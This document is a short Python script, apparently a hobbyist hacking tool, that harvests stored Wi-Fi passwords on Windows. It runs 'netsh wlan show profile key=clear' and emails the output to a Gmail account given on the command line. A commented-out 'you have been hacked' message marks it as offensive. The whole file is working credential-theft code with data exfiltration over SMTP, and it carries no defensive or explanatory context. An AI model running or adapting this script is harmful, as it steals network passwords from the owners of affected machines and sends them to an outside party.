#!/usr/bin/env python3
import os
import re
import subprocess,smtplib
import argparse
import time
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--user",help="email id") # 
    parser.add_argument("-p","--password",help="email password") # 
    options= parser.parse_args()
    return options

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587) # google server,port
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message) # from my email to my email
    server.quit()

#main
if __name__ == "__main__":
 
    options = get_arguments()
    user = options.user
    password = options.password
    print(user + '/' + password)

    #command = "msg * you have been hacked"
    #subprocess.Popen(command,shell=True)
    #
    command = "netsh wlan show profile key=clear"
    result = subprocess.check_output(command,shell=True)
    print(result)
    send_mail(user,password,result)